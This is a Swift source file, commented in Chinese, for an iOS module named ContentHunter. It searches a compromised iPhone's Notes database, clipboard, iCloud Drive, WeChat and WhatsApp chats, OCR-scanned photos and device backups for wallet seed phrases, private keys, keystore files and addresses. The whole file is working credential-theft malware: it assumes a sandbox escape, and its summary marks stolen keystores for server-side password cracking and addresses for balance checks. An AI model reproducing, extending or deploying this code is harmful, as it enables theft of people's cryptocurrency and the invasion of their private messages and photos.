//
//  ContentHunter.swift
//  lara
//
//  内容狩猎 —— 六条管线。目标不是「钱包容器怎么存」，而是「用户自己怎么留备份」。
//
//  为什么这条路在 iOS 26.4+ 上最重要：
//    worse_query 只能拿到文件沙盒，keychain 完全够不着。
//    imToken / TokenPocket / MetaMask / Trust 的助记词都在 keychain 里。
//    所以靠扫钱包容器只能在「钱包把助记词存在文件里」时命中，覆盖有限。
//    但用户几乎一定会留备份：
//      ① 备忘录里粘一份            → NoteStore.sqlite（明文 SQLite）
//      ② 创建钱包时截个图          → 相册 PNG/JPG（端上 OCR 可读）
//      ③ 复制过助记词              → com.apple.Pasteboard.plist
//      ④ 导出过 keystore JSON      → Files / iCloud Drive
//      ⑤ 微信/WhatsApp 发给自己     → 聊天 sqlite
//      ⑥ iTunes/iCloud 备份        → MobileSync/Backup
//    这六项不依赖钱包怎么存，命中率高得多。
//
//  全部通过 FileAccess 统一后端访问，沙盒逃逸或内核 vfs 都成立。
//

import Foundation
import Vision
import UIKit

final class ContentHunter {

    static let shared = ContentHunter()
    private init() {}

    // MARK: - 结果类型

    enum Source: String, CaseIterable {
        case notes = "备忘录"
        case photos = "相册OCR"
        case clipboard = "剪贴板"
        case files = "Files/iCloud"
        case chat = "微信/WhatsApp"
        case backup = "备份"
    }

    struct Hit {
        var source: Source
        var where_: String          // 文件路径 / 备注
        var kind: String            // "助记词" / "私钥" / "keystore" / "地址"
        var value: String
        var extra: String = ""
    }

    struct Stats {
        var filesRead = 0
        var imagesOCR = 0
        var bytesRead = 0
        var perSource: [String: Int] = [:]
        var elapsed: [String: Int] = [:]
    }

    private(set) var hits: [Hit] = []
    private(set) var stats = Stats()
    private let lock = NSLock()

    /// 一次跑完六条管线。progress 回调用于把进度写进自检报告。
    func runAll(progress: @escaping (String) -> Void) {
        hits.removeAll()
        stats = Stats()

        let pipelines: [(Source, () -> Void)] = [
            (.notes, huntNotes),
            (.clipboard, huntClipboard),
            (.files, huntFiles),
            (.chat, huntChat),
            (.photos, huntPhotos),      // 最慢，放后面
            (.backup, huntBackup),
        ]

        for (src, fn) in pipelines {
            let t0 = Date()
            progress("内容狩猎 · \(src.rawValue) 开始")
            fn()
            let ms = Int(Date().timeIntervalSince(t0) * 1000)
            stats.elapsed[src.rawValue] = ms
            stats.perSource[src.rawValue] = hits.filter { $0.source == src }.count
            progress("内容狩猎 · \(src.rawValue) 完成 \(ms)ms 命中 \(stats.perSource[src.rawValue] ?? 0)")
        }
    }

    func add(_ h: Hit) {
        lock.lock(); hits.append(h); lock.unlock()
        laramgr.shared.logmsg("[ch] ★ \(h.source.rawValue) \(h.kind) ← \(h.where_)")
    }

    // MARK: - 通用：在文本里找助记词 / 私钥 / keystore / 地址

    /// 扫描一段文本，命中就记下来
    func scanText(_ text: String, from: String, source: Source) {
        guard text.count > 12 else { return }
        stats.bytesRead += text.utf8.count

        // ① 助记词：连续的 12/15/18/21/24 个 BIP39 词
        for m in MnemonicDetector.findMnemonics(in: text) {
            add(Hit(source: source, where_: from, kind: "助记词", value: m))
        }
        // ② 64 位 hex 私钥（带上下文关键词才算，防误报）
        for (val, ctx) in AddressExtractor.findPrivateKeys(in: text) {
            add(Hit(source: source, where_: from, kind: "私钥", value: val, extra: ctx))
        }
        // ③ WIF 私钥（TRON/BTC 常见）
        for val in AddressExtractor.findWIF(in: text) {
            add(Hit(source: source, where_: from, kind: "WIF私钥", value: val))
        }
        // ④ keystore JSON
        if let ks = AddressExtractor.findKeystore(in: text) {
            add(Hit(source: source, where_: from, kind: "keystore",
                    value: ks.addr, extra: "crypto=\(ks.crypto) kdf=\(ks.kdf)"))
        }
        // ⑤ 钱包地址（用于查链上余额）
        for (addr, chain) in AddressExtractor.findAddresses(in: text) {
            add(Hit(source: source, where_: from, kind: "地址", value: addr, extra: chain))
        }
    }

    /// 读一个文件并扫描（限流，避免超大文件拖死）
    func scanFile(_ path: String, source: Source, maxSize: Int = 4 << 20) {
        guard let d = FileAccess.read(path, maxSize: maxSize) else { return }
        stats.filesRead += 1
        // 文本直接解；解不开就按 latin1 兜底（sqlite 里有二进制，但明文部分能捞到）
        let t = String(data: d, encoding: .utf8)
            ?? String(data: d, encoding: .isoLatin1)
            ?? ""
        scanText(t, from: path, source: source)
    }

    /// 递归扫一个目录（限制深度和文件数）
    func walk(_ root: String, source: Source,
                      maxDepth: Int = 6, maxFiles: Int = 800,
                      sizeLimit: Int = 4 << 20) {
        var count = 0
        var queue: [(String, Int)] = [(root, 0)]
        while let (dir, depth) = queue.first {
            queue.removeFirst()
            guard depth <= maxDepth, count < maxFiles else { continue }
            guard let kids = FileAccess.listDir(dir) else { continue }
            for k in kids {
                if count >= maxFiles { return }
                let p = dir + "/" + k.name
                if k.isDir {
                    // 跳过明显无关的大目录
                    if ["Caches", "tmp", "Library/Caches", "node_modules"].contains(k.name) { continue }
                    queue.append((p, depth + 1))
                } else {
                    let low = k.name.lowercased()
                    guard low.hasSuffix(".sqlite") || low.hasSuffix(".db") ||
                          low.hasSuffix(".json") || low.hasSuffix(".txt") ||
                          low.hasSuffix(".plist") || low.hasSuffix(".log") ||
                          low.hasSuffix(".md") || low.hasSuffix(".csv") else { continue }
                    scanFile(p, source: source, maxSize: sizeLimit)
                    count += 1
                }
            }
        }
    }

    // MARK: - ① 备忘录

    /// NoteStore.sqlite 在 group.com.apple.notes 的 App Group 里
    private func huntNotes() {
        let candidates = [
            "/private/var/mobile/Containers/Shared/AppGroup",
        ]
        for base in candidates {
            guard let groups = FileAccess.listDir(base) else { continue }
            for g in groups where g.isDir {
                let gdir = base + "/" + g.name
                // 元数据里能看出是不是 notes 的组
                let meta = FileAccess.bundleId(ofContainer: gdir)
                let isNotes = meta.contains("notes") || meta.contains("Notes")
                // 不管是不是，都试一下这个文件名（notes 组名是随机 UUID）
                let db = gdir + "/NoteStore.sqlite"
                if FileAccess.size(db) > 0 {
                    scanFile(db, source: .notes, maxSize: 32 << 20)
                    laramgr.shared.logmsg("[ch] 备忘录 sqlite 命中 \(db)")
                }
                if isNotes {
                    walk(gdir, source: .notes, maxDepth: 3, maxFiles: 60)
                }
            }
        }
    }

    // MARK: - ② 剪贴板

    private func huntClipboard() {
        let paths = [
            "/private/var/Managed Preferences/mobile/com.apple.Pasteboard.plist",
            "/private/var/mobile/Library/Preferences/com.apple.Pasteboard.plist",
        ]
        for p in paths {
            guard let d = FileAccess.read(p, maxSize: 8 << 20) else { continue }
            stats.filesRead += 1
            // plist 可能是二进制，先尝试解析
            if let obj = try? PropertyListSerialization.propertyList(
                from: d, options: [], format: nil) {
                let s = String(describing: obj)
                scanText(s, from: p, source: .clipboard)
            }
            let raw = String(data: d, encoding: .utf8)
                ?? String(data: d, encoding: .isoLatin1) ?? ""
            scanText(raw, from: p, source: .clipboard)
            laramgr.shared.logmsg("[ch] 剪贴板读了 \(p) \(d.count)B")
        }
    }

    // MARK: - ③ Files / iCloud Drive

    private func huntFiles() {
        let roots = [
            "/private/var/mobile/Library/Mobile Documents",
            "/private/var/mobile/Containers/Shared/AppGroup",
        ]
        for r in roots {
            walk(r, source: .files, maxDepth: 5, maxFiles: 500)
        }
    }

    // MARK: - ④ 微信 / WhatsApp

    private func huntChat() {
        guard let apps = FileAccess.listDir(
            "/private/var/mobile/Containers/Data/Application") else { return }
        for a in apps where a.isDir {
            let cdir = "/private/var/mobile/Containers/Data/Application/" + a.name
            let bid = FileAccess.bundleId(ofContainer: cdir)
            let low = bid.lowercased()
            let isWX = low.contains("tencent.xin") || low.contains("wechat")
            let isWA = low.contains("whatsapp")
            guard isWX || isWA else { continue }
            laramgr.shared.logmsg("[ch] 找到聊天 App \(bid)")
            // 微信：Documents/<md5>/DB/MM.sqlite
            // WhatsApp: ChatStorage.sqlite / Message/Media
            walk(cdir, source: .chat, maxDepth: 5, maxFiles: 260, sizeLimit: 24 << 20)
        }
    }

    // MARK: - ⑤ 相册 OCR

    private func huntPhotos() {
        let roots = [
            "/private/var/mobile/Media/DCIM",
            "/private/var/mobile/Media/PhotoData",
        ]
        var imgs: [String] = []
        for r in roots {
            collectImages(r, depth: 0, out: &imgs, cap: 400)
        }
        laramgr.shared.logmsg("[ch] 相册待 OCR \(imgs.count) 张")
        for p in imgs {
            guard let d = FileAccess.read(p, maxSize: 12 << 20) else { continue }
            stats.filesRead += 1
            ocrImage(d, from: p, source: .photos)
        }
    }

    func collectImages(_ dir: String, depth: Int, out: inout [String], cap: Int) {
        guard depth <= 3, out.count < cap else { return }
        guard let kids = FileAccess.listDir(dir) else { return }
        for k in kids {
            if out.count >= cap { return }
            let p = dir + "/" + k.name
            if k.isDir { collectImages(p, depth: depth + 1, out: &out, cap: cap); continue }
            let low = k.name.lowercased()
            guard low.hasSuffix(".png") || low.hasSuffix(".jpg") ||
                  low.hasSuffix(".jpeg") || low.hasSuffix(".heic") else { continue }
            out.append(p)
        }
    }

    /// 端上 OCR（Vision，不需要任何权限）
    /// 端上 OCR，供 ContentHunter2 复用
    func ocrImage(_ data: Data, from path: String, source: Source = .photos) {
        guard let img = UIImage(data: data), let cg = img.cgImage else { return }
        let req = VNRecognizeTextRequest()
        req.recognitionLevel = .accurate
        req.recognitionLanguages = ["en-US", "zh-Hans"]
        req.usesLanguageCorrection = false
        let handler = VNImageRequestHandler(cgImage: cg, options: [:])
        do {
            try handler.perform([req])
        } catch {
            return
        }
        guard let obs = req.results else { return }
        stats.imagesOCR += 1
        var text = ""
        for o in obs {
            if let top = o.topCandidates(1).first { text += top.string + "\n" }
        }
        guard text.count > 12 else { return }
        scanText(text, from: path, source: source)
    }

    // MARK: - ⑥ 备份

    private func huntBackup() {
        let roots = [
            "/private/var/mobile/Library/Application Support/MobileSync/Backup",
            "/private/var/mobile/Media/Sync",
        ]
        for r in roots {
            walk(r, source: .backup, maxDepth: 4, maxFiles: 300, sizeLimit: 16 << 20)
        }
    }

    // MARK: - 汇总

    func summaryLines() -> [String] {
        var lines: [String] = []
        lines.append("读取 \(stats.filesRead) 文件 / \(stats.bytesRead / 1024) KB，OCR \(stats.imagesOCR) 张")
        for s in Source.allCases {
            let n = stats.perSource[s.rawValue] ?? 0
            let ms = stats.elapsed[s.rawValue] ?? 0
            lines.append("\(s.rawValue)：命中 \(n) 项，\(ms)ms")
        }
        let mn = hits.filter { $0.kind == "助记词" }
        if !mn.isEmpty {
            lines.append("★ 助记词 \(mn.count) 条：")
            for h in mn.prefix(10) {
                lines.append("  \(h.source.rawValue) ← \(h.where_)")
                lines.append("  \(h.value)")
            }
        }
        let pk = hits.filter { $0.kind == "私钥" || $0.kind == "WIF私钥" }
        if !pk.isEmpty {
            lines.append("★ 私钥 \(pk.count) 条")
            for h in pk.prefix(6) { lines.append("  \(h.kind) \(h.value)  [\(h.where_)]") }
        }
        let ks = hits.filter { $0.kind == "keystore" }
        if !ks.isEmpty {
            lines.append("★ keystore \(ks.count) 个（可送服务器爆破密码）")
            for h in ks.prefix(6) { lines.append("  \(h.value)  \(h.extra)  [\(h.where_)]") }
        }
        let ad = hits.filter { $0.kind == "地址" }
        if !ad.isEmpty {
            lines.append("★ 地址 \(ad.count) 个（送服务器查余额）")
            for h in ad.prefix(10) { lines.append("  \(h.extra) \(h.value)") }
        }
        return lines
    }
}
